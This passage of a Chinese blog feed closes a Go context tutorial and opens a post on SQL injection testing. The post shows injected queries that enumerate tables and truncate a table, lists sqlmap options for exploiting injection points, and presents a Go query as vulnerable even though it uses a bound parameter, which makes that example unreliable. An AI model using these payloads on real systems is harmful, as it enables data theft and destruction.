<p>context的根节点使用context.Background()函数来创建，上面也有写到，Background函数会返回一个emptyCtx，一个空的context，不能被取消，没有值也没有超时时间</p>
<p>创建子节点的方法</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-GO" data-lang="GO"><span class="kd">func</span> <span class="nf">WithCancel</span><span class="p">(</span><span class="nx">parent</span> <span class="nx">Context</span><span class="p">)</span> <span class="p">(</span><span class="nx">ctx</span> <span class="nx">Context</span><span class="p">,</span> <span class="nx">cancel</span> <span class="nx">CancelFunc</span><span class="p">)</span> <span class="p">{</span>
<span class="kd">func</span> <span class="nf">WithValue</span><span class="p">(</span><span class="nx">parent</span> <span class="nx">Context</span><span class="p">,</span> <span class="nx">key</span><span class="p">,</span> <span class="nx">val</span> <span class="kd">interface</span><span class="p">{})</span> <span class="nx">Context</span> <span class="p">{</span>
<span class="kd">func</span> <span class="nf">WithTimeout</span><span class="p">(</span><span class="nx">parent</span> <span class="nx">Context</span><span class="p">,</span> <span class="nx">timeout</span> <span class="nx">time</span><span class="p">.</span><span class="nx">Duration</span><span class="p">)</span> <span class="p">(</span><span class="nx">Context</span><span class="p">,</span> <span class="nx">CancelFunc</span><span class="p">)</span> <span class="p">{</span>
<span class="kd">func</span> <span class="nf">WithDeadline</span><span class="p">(</span><span class="nx">parent</span> <span class="nx">Context</span><span class="p">,</span> <span class="nx">d</span> <span class="nx">time</span><span class="p">.</span><span class="nx">Time</span><span class="p">)</span> <span class="p">(</span><span class="nx">Context</span><span class="p">,</span> <span class="nx">CancelFunc</span><span class="p">)</span> <span class="p">{</span>
</code></pre></td></tr></table>
</div>
</div><p>一个一个来写一下</p>
<h3 id="withcancel">WithCancel</h3>
<p>WithCancel 传入一个context的根节点，返回一个context的副本，和一个cancel方法</p>
<p>context的副本用于传入到子goroutine中</p>
<p>cancel用于通知子goroutine关闭</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="kn">package</span> <span class="nx">main</span>

<span class="kn">import</span> <span class="p">(</span>
   <span class="s">&#34;context&#34;</span>
   <span class="s">&#34;fmt&#34;</span>
   <span class="s">&#34;sync&#34;</span>
   <span class="s">&#34;time&#34;</span>
<span class="p">)</span>

<span class="kd">var</span> <span class="nx">wg</span> <span class="nx">sync</span><span class="p">.</span><span class="nx">WaitGroup</span>

<span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
   <span class="nf">Work</span><span class="p">()</span>
<span class="p">}</span>

<span class="kd">func</span> <span class="nf">Work</span><span class="p">()</span> <span class="p">{</span>
   <span class="nx">ctx</span><span class="p">,</span> <span class="nx">cancel</span> <span class="o">:=</span> <span class="nx">context</span><span class="p">.</span><span class="nf">WithCancel</span><span class="p">(</span><span class="nx">context</span><span class="p">.</span><span class="nf">Background</span><span class="p">())</span>
   <span class="nx">wg</span><span class="p">.</span><span class="nf">Add</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
   <span class="k">go</span> <span class="nf">Preloading</span><span class="p">(</span><span class="nx">ctx</span><span class="p">)</span> <span class="c1">//开启一个子goroutine，并把返回的context的副本传入
</span><span class="c1"></span>   <span class="nx">time</span><span class="p">.</span><span class="nf">Sleep</span><span class="p">(</span><span class="nx">time</span><span class="p">.</span><span class="nx">Second</span> <span class="o">*</span> <span class="mi">3</span><span class="p">)</span>
   <span class="nf">cancel</span><span class="p">()</span> <span class="c1">//调用cancel关闭context.done，子goroutine通过select ctx.Done来关闭进程
</span><span class="c1"></span>   <span class="nx">wg</span><span class="p">.</span><span class="nf">Wait</span><span class="p">()</span>
<span class="p">}</span>

<span class="kd">func</span> <span class="nf">Preloading</span><span class="p">(</span><span class="nx">ctx</span> <span class="nx">context</span><span class="p">.</span><span class="nx">Context</span><span class="p">)</span> <span class="p">{</span>

    <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;loading...&#34;</span><span class="p">)</span>
	<span class="c1">// 等待发出关闭信号
</span><span class="c1"></span>    <span class="k">for</span> <span class="p">{</span>
		<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;wait...&#34;</span><span class="p">)</span>
        <span class="nx">time</span><span class="p">.</span><span class="nf">Sleep</span><span class="p">(</span><span class="nx">time</span><span class="p">.</span><span class="nx">Second</span><span class="p">)</span>
        <span class="k">select</span> <span class="p">{</span>
            <span class="k">case</span> <span class="o">&lt;-</span><span class="nx">ctx</span><span class="p">.</span><span class="nf">Done</span><span class="p">():</span> <span class="c1">//当cancel被调用时，context.done会被关闭，这里会select到ctx.Done的零值
</span><span class="c1"></span>            <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;ctx.Done close&#34;</span><span class="p">)</span>
            <span class="nx">wg</span><span class="p">.</span><span class="nf">Done</span><span class="p">()</span>
            <span class="k">return</span>
        <span class="k">default</span><span class="p">:</span>
            <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;ctx.Done not close&#34;</span><span class="p">)</span>
        <span class="p">}</span>
   <span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="withvalue">WithValue</h3>
<p>该函数将传入的键值对传入到根节点</p>
<p>传入一个根节点，和kv对，k必须是可以比较的，返回一个context的副本，用于传入子goroutine</p>
<p>一个简单的例子</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="kn">package</span> <span class="nx">main</span>

<span class="kn">import</span> <span class="p">(</span>
   <span class="s">&#34;context&#34;</span>
   <span class="s">&#34;fmt&#34;</span>
<span class="p">)</span>


<span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
   <span class="nf">Work</span><span class="p">()</span>
<span class="p">}</span>

<span class="kd">func</span> <span class="nf">Work</span><span class="p">()</span> <span class="p">{</span>
   <span class="nx">ctx</span> <span class="o">:=</span> <span class="nx">context</span><span class="p">.</span><span class="nf">WithValue</span><span class="p">(</span><span class="nx">context</span><span class="p">.</span><span class="nf">Background</span><span class="p">(),</span> <span class="mi">1</span><span class="p">,</span> <span class="s">&#34;a&#34;</span><span class="p">)</span>
   <span class="nf">Preloading</span><span class="p">(</span><span class="nx">ctx</span><span class="p">)</span>
<span class="p">}</span>

<span class="kd">func</span> <span class="nf">Preloading</span><span class="p">(</span><span class="nx">ctx</span> <span class="nx">context</span><span class="p">.</span><span class="nx">Context</span><span class="p">)</span> <span class="p">{</span>
   <span class="nx">id</span><span class="p">,</span> <span class="nx">ok</span> <span class="o">:=</span> <span class="nx">ctx</span><span class="p">.</span><span class="nf">Value</span><span class="p">(</span><span class="mi">1</span><span class="p">).(</span><span class="kt">string</span><span class="p">)</span> <span class="c1">//如果找到了为1的key，则返回1的val和ok
</span><span class="c1"></span>   <span class="k">if</span> <span class="nx">ok</span> <span class="p">{</span>
      <span class="nx">fmt</span><span class="p">.</span><span class="nf">Printf</span><span class="p">(</span><span class="s">&#34;work id 1 is val: %s&#34;</span><span class="p">,</span> <span class="nx">id</span><span class="p">)</span>
   <span class="p">}</span><span class="k">else</span> <span class="p">{</span>
      <span class="nx">fmt</span><span class="p">.</span><span class="nf">Printf</span><span class="p">(</span><span class="s">&#34;not work id 1\n&#34;</span><span class="p">)</span>
   <span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="withtimeout">WithTimeout</h3>
<p>传入一个context根节点和一个时段</p>
<p>返回一个context根节点的副本和一个cancel</p>
<p>context根节点的副本用于传入子goroutine，cancel用于通知子goroutine关闭</p>
<p>一个简单的例子</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="kn">package</span> <span class="nx">main</span>

<span class="kn">import</span> <span class="p">(</span>
   <span class="s">&#34;context&#34;</span>
   <span class="s">&#34;fmt&#34;</span>
   <span class="s">&#34;sync&#34;</span>
   <span class="s">&#34;time&#34;</span>
<span class="p">)</span>

<span class="kd">var</span> <span class="nx">wg</span> <span class="nx">sync</span><span class="p">.</span><span class="nx">WaitGroup</span>

<span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
   <span class="nf">Work</span><span class="p">()</span>
<span class="p">}</span>

<span class="kd">func</span> <span class="nf">Work</span><span class="p">()</span> <span class="p">{</span>
   <span class="nx">ctx</span><span class="p">,</span> <span class="nx">cancel</span> <span class="o">:=</span> <span class="nx">context</span><span class="p">.</span><span class="nf">WithTimeout</span><span class="p">(</span><span class="nx">context</span><span class="p">.</span><span class="nf">Background</span><span class="p">(),</span> <span class="nx">time</span><span class="p">.</span><span class="nx">Second</span><span class="o">*</span><span class="mi">5</span><span class="p">)</span>

   <span class="nx">wg</span><span class="p">.</span><span class="nf">Add</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
   <span class="k">go</span> <span class="nf">Preloading</span><span class="p">(</span><span class="nx">ctx</span><span class="p">)</span>
   <span class="nx">time</span><span class="p">.</span><span class="nf">Sleep</span><span class="p">(</span><span class="nx">time</span><span class="p">.</span><span class="nx">Second</span> <span class="o">*</span> <span class="mi">6</span><span class="p">)</span>
   <span class="nf">cancel</span><span class="p">()</span> <span class="c1">//如果工作已经完毕了，但是时间还没到，可以调用cancel来关闭
</span><span class="c1"></span>   <span class="nx">wg</span><span class="p">.</span><span class="nf">Wait</span><span class="p">()</span>
<span class="p">}</span>

<span class="kd">func</span> <span class="nf">Preloading</span><span class="p">(</span><span class="nx">ctx</span> <span class="nx">context</span><span class="p">.</span><span class="nx">Context</span><span class="p">)</span> <span class="p">{</span>
   <span class="k">for</span> <span class="p">{</span>
      <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;wait...&#34;</span><span class="p">)</span>
      <span class="nx">time</span><span class="p">.</span><span class="nf">Sleep</span><span class="p">(</span><span class="nx">time</span><span class="p">.</span><span class="nx">Second</span><span class="p">)</span>
      <span class="k">select</span> <span class="p">{</span>
      <span class="k">case</span> <span class="o">&lt;-</span><span class="nx">ctx</span><span class="p">.</span><span class="nf">Done</span><span class="p">():</span>
         <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;ctx.Done close&#34;</span><span class="p">)</span>
         <span class="nx">wg</span><span class="p">.</span><span class="nf">Done</span><span class="p">()</span>
         <span class="k">return</span>
      <span class="k">default</span><span class="p">:</span>
         <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;ctx.Done not close&#34;</span><span class="p">)</span>
      <span class="p">}</span>
   <span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="withdeadline">WithDeadline</h3>
<p>跟WithTimeout很相似</p>
<p>传入一个context根节点和一个未来时间点，返回一个context根节点的副本和cancel</p>
<p>context的副本用于传入子goroutine，cancel用于通知子goroutine关闭</p>
<p>一个简单的例子</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="kn">package</span> <span class="nx">main</span>

<span class="kn">import</span> <span class="p">(</span>
   <span class="s">&#34;context&#34;</span>
   <span class="s">&#34;fmt&#34;</span>
   <span class="s">&#34;sync&#34;</span>
   <span class="s">&#34;time&#34;</span>
<span class="p">)</span>

<span class="kd">var</span> <span class="nx">wg</span> <span class="nx">sync</span><span class="p">.</span><span class="nx">WaitGroup</span>

<span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
   <span class="nf">Work</span><span class="p">()</span>
<span class="p">}</span>

<span class="kd">func</span> <span class="nf">Work</span><span class="p">()</span> <span class="p">{</span>
   <span class="nx">d</span> <span class="o">:=</span> <span class="nx">time</span><span class="p">.</span><span class="nf">Now</span><span class="p">().</span><span class="nf">Add</span><span class="p">(</span><span class="nx">time</span><span class="p">.</span><span class="nx">Second</span> <span class="o">*</span> <span class="mi">5</span><span class="p">)</span> <span class="c1">//定义一个未来时间点
</span><span class="c1"></span>   <span class="nx">ctx</span><span class="p">,</span> <span class="nx">cancel</span> <span class="o">:=</span> <span class="nx">context</span><span class="p">.</span><span class="nf">WithDeadline</span><span class="p">(</span><span class="nx">context</span><span class="p">.</span><span class="nf">Background</span><span class="p">(),</span> <span class="nx">d</span><span class="p">)</span>

   <span class="nx">wg</span><span class="p">.</span><span class="nf">Add</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
   <span class="k">go</span> <span class="nf">Preloading</span><span class="p">(</span><span class="nx">ctx</span><span class="p">)</span>
   <span class="nx">time</span><span class="p">.</span><span class="nf">Sleep</span><span class="p">(</span><span class="nx">time</span><span class="p">.</span><span class="nx">Second</span> <span class="o">*</span> <span class="mi">6</span><span class="p">)</span>
   <span class="k">defer</span> <span class="nf">cancel</span><span class="p">()</span> <span class="c1">//如果工作已经完毕了，但是时间还没到，可以调用cancel来关闭
</span><span class="c1"></span>   <span class="nx">wg</span><span class="p">.</span><span class="nf">Wait</span><span class="p">()</span>
<span class="p">}</span>

<span class="kd">func</span> <span class="nf">Preloading</span><span class="p">(</span><span class="nx">ctx</span> <span class="nx">context</span><span class="p">.</span><span class="nx">Context</span><span class="p">)</span> <span class="p">{</span>
   <span class="k">for</span> <span class="p">{</span>
      <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;wait...&#34;</span><span class="p">)</span>
      <span class="nx">time</span><span class="p">.</span><span class="nf">Sleep</span><span class="p">(</span><span class="nx">time</span><span class="p">.</span><span class="nx">Second</span><span class="p">)</span>
      <span class="k">select</span> <span class="p">{</span>
      <span class="k">case</span> <span class="o">&lt;-</span><span class="nx">ctx</span><span class="p">.</span><span class="nf">Done</span><span class="p">():</span>
         <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;ctx.Done close&#34;</span><span class="p">)</span>
         <span class="nx">wg</span><span class="p">.</span><span class="nf">Done</span><span class="p">()</span>
         <span class="k">return</span>
      <span class="k">default</span><span class="p">:</span>
         <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;ctx.Done not close&#34;</span><span class="p">)</span>
      <span class="p">}</span>
   <span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="总结">总结</h2>
<p>像 <code>WithCancel</code>、<code>WithDeadline</code>、<code>WithTimeout</code>、<code>WithValue</code> 这些创建函数</p>
<p>实际上是创建了一个个的链表结点而已。我们知道，对链表的操作，通常都是 <code>O(n)</code> 复杂度的，效率不高。</p>
<p>那么，context 包到底解决了什么问题呢？</p>
<p>答案是：<code>cancelation</code>。仅管它并不完美，但它确实很简洁地解决了问题。</p>
<p>&ndash;摘自：<code>https://qcrao.com/2019/06/12/dive-into-go-context/</code></p>
<ul>
<li>在使用中对容易造成内存泄漏的地方，要特别注意cancel的调用</li>
</ul>
<h2 id="学习资料">学习资料</h2>
<p>Go SDK 1.14.4 context</p>
<p><a href="https://qcrao.com/2019/06/12/dive-into-go-context/">https://qcrao.com/2019/06/12/dive-into-go-context/</a></p>
<p><a href="https://draveness.me/golang/docs/part3-runtime/ch06-concurrency/golang-context/">https://draveness.me/golang/docs/part3-runtime/ch06-concurrency/golang-context/</a></p>
<p><a href="https://www.liwenzhou.com/posts/Go/go_context/#autoid-0-1-4">https://www.liwenzhou.com/posts/Go/go_context/#autoid-0-1-4</a></p>
]]></description>
</item><item>
    <title>安全测试之-SQL注入</title>
    <link>https://testoai.github.io/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/</link>
    <pubDate>Thu, 29 Apr 2021 09:43:23 &#43;0800</pubDate>
    <author>作者</author>
    <guid>https://testoai.github.io/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/</guid>
    <description><![CDATA[<h2 id="什么是sql注入">什么是<code>SQL</code>注入</h2>
<p>当被测程序没有对没有对输入参数进行校验的情况下，请求方可以向参数中添加一些影响SQL的字符，导致程序直接用请求者传入的参数去数据库查询，会导致原有的SQL被修改，不能按预期执行</p>
<h2 id="sql注入示例"><code>SQL</code>注入示例</h2>
<p>比如一个查询接口，查询指定时间段内的数据</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">SELECT</span>
	<span class="o">*</span> 
<span class="k">FROM</span>
	<span class="n">STAPP</span> 
<span class="k">WHERE</span>
	<span class="n">TC_OD_OPT_DT</span> <span class="o">&gt;</span> <span class="s1">&#39;2020-11-16 15:05:01&#39;</span>
	<span class="k">AND</span> <span class="n">TC_OD_OPT_DT</span> <span class="o">&lt;</span> <span class="s1">&#39;2020-11-18 15:05:01&#39;</span>
	<span class="k">LIMIT</span> <span class="mi">0</span><span class="p">,</span><span class="mi">30</span><span class="p">;</span>
</code></pre></td></tr></table>
</div>
</div><p>如果没有对输入参数做校验，前端传入了截断字符串的参数，那<code>SQL</code>就变成了下面这样</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">SELECT</span>
	<span class="o">*</span> 
<span class="k">FROM</span>
	<span class="n">STAPP</span> 
<span class="k">WHERE</span>
	<span class="n">TC_OD_OPT_DT</span> <span class="o">&gt;</span> <span class="s1">&#39;2000-11-16 15:05:01&#39;</span>
	<span class="k">AND</span> <span class="n">TC_OD_OPT_DT</span> <span class="o">&lt;</span> <span class="s1">&#39;2020-11-18 15:05:01&#39;</span><span class="p">;</span><span class="c1">#&#39;) LIMIT 0,30;
</span></code></pre></td></tr></table>
</div>
</div><p>上面的查询直接查询了很长一段时间范围内的数据，如果数据量非常大的话，会对数据库造成较大压力</p>
<p>或者</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">SELECT</span>
	<span class="o">*</span> 
<span class="k">FROM</span>
	<span class="n">STAPP</span> 
<span class="k">WHERE</span>
	<span class="n">TC_OD_OPT_DT</span> <span class="o">&gt;</span> <span class="s1">&#39;2000-11-16 15:05:01&#39;</span>
	<span class="k">AND</span> <span class="n">TC_OD_OPT_DT</span> <span class="o">&lt;</span> <span class="s1">&#39;2020-11-18 15:05:01&#39;</span><span class="p">;</span>
<span class="k">select</span> <span class="n">table_name</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="kp">tables</span><span class="p">;</span><span class="c1">#&#39;) LIMIT 0,30;
</span></code></pre></td></tr></table>
</div>
</div><p>上面的操作就获取到了所有表名称</p>
<p>如果业务登录的用户权限够大的话，然后就可以这样</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">SELECT</span>
	<span class="o">*</span> 
<span class="k">FROM</span>
	<span class="n">STAPP</span> 
<span class="k">WHERE</span>
	<span class="n">TC_OD_OPT_DT</span> <span class="o">&gt;</span> <span class="s1">&#39;2000-11-16 15:05:01&#39;</span>
	<span class="k">AND</span> <span class="n">TC_OD_OPT_DT</span> <span class="o">&lt;</span> <span class="s1">&#39;2020-11-18 15:05:01&#39;</span><span class="p">;</span>
<span class="n">truncate</span> <span class="k">table</span> <span class="n">STAPP</span><span class="p">;</span><span class="c1">#&#39;) LIMIT 0,30;
</span></code></pre></td></tr></table>
</div>
</div><p>上面的操作会清空整张<code>STAPP</code>表</p>
<h2 id="注入点">注入点</h2>
<ul>
<li>
<p>文本框注入</p>
<ul>
<li>常见的用户名文本输入框，密码文本输入框，查询文本输入框</li>
</ul>
</li>
<li>
<p><code>url</code>注入</p>
<ul>
<li>
<p>针对连接后面的参数进行测试，比如在网站上点击一篇文章，网站前端会把文章的ID放到<code>url</code>中发送<code>GET</code>请求到服务端</p>
<p>如：<code>https://www.jianshu.com/p/178ca3ddc866</code>，可以对最后面的文章id进行注入测试</p>
</li>
</ul>
</li>
<li>
<p>工具</p>
<ul>
<li><code>spider</code>：可以获取到一个网址的所有链接</li>
<li><code>sqlmap</code>：开源渗透测试工具，能自动检测利用<code>SQL</code>注入缺陷并接管数据库服务器</li>
</ul>
<p><code>sqlmap</code>使用方法：</p>
<ul>
<li><code>sqlmap -u &quot;url&quot;</code>：检测注入点，<code>url</code>中必须有例如<code>id=123</code>类似的参数</li>
<li><code>sqlmap -l</code>：从<code>Burpsuite proxy</code>或<code>WebScarab proxy</code>中读取<code>http</code>请求日志文件</li>
<li><code>sqlmap -x</code>：从<code>sitemap.xml</code>站点地图文件中读取目标检测</li>
<li><code>sqlmap -m</code>：从多行文本格式文件读取多个目标，对多个目标进行探测</li>
<li><code>sqlmap -r</code>：从<code>Burp suite</code>保存的文本文件中读取<code>http</code>请求作为注入探测的目标</li>
<li><code>sqlmap -c</code>：从配置文件<code>sqlmap.conf</code>中读取目标探测</li>
</ul>
</li>
</ul>
<h2 id="注入方法">注入方法</h2>
<h3 id="布尔盲注">布尔盲注</h3>
<ul>
<li>可以进行注入，但是不能通过注入直接拿到数据库中的数据</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="nf">SelectUser</span><span class="p">(</span><span class="nx">db</span> <span class="o">*</span><span class="nx">sql</span><span class="p">.</span><span class="nx">DB</span><span class="p">,</span> <span class="nx">name</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">bool</span> <span class="p">{</span>
	<span class="nx">rows</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">db</span><span class="p">.</span><span class="nf">Query</span><span class="p">(</span><span class="s">`SELECT u.&#34;name&#34; FROM &#34;user&#34; u WHERE u.&#34;name&#34; = $1`</span><span class="p">,</span><span class="nx">name</span><span class="p">)</span>
	<span class="nf">ifErr</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
	<span class="nx">user</span> <span class="o">:=</span> <span class="nx">User</span><span class="p">{}</span>
    <span class="k">for</span> <span class="nx">rows</span><span class="p">.</span><span class="nf">Next</span><span class="p">()</span> <span class="p">{</span>
		<span class="nx">err</span> <span class="o">:=</span> <span class="nx">rows</span><span class="p">.</span><span class="nf">Scan</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">user</span><span class="p">.</span><span class="nx">Name</span><span class="p">)</span>
		<span class="nf">ifErr</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
        <span class="k">if</span> <span class="nx">user</span><span class="p">.</span><span class="nx">Name</span> <span class="o">==</span> <span class="s">&#34;&#34;</span><span class="p">{</span>
			<span class="k">return</span> <span class="kc">false</span>
        <span class="p">}</span><span class="k">else</span> <span class="p">{</span>
            <span class="k">return</span> <span class="kc">true</span>
        <span class="p">}</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>如果上面代码中的<code>db.Query</code>方法没有对传入的<code>name</code>参数做校验的话，那么该程序是存在注入漏洞的</p>
<p>虽然没有返回查询数据与错误信息，但是返回了查询结果</p>
<p>如果正常查询操作，会返回正常的结果</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">SelectUser(db,&#34;test&#34;)//查询到test则返回true，否则返回false
</code></pre></td></tr></table>
</div>
</div><p>如果传入一个非法参数，如下所示</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">SelectUser(db,&#34;test&#39;&#34;)
</code></pre></td></tr></table>
</div>
</div><p>上面传入的<code>name</code>参数为<code>test</code>的值存在，当在后面输入一个截断的单引号时，该<code>sql</code>会执行失败，会返回<code>false</code></p>
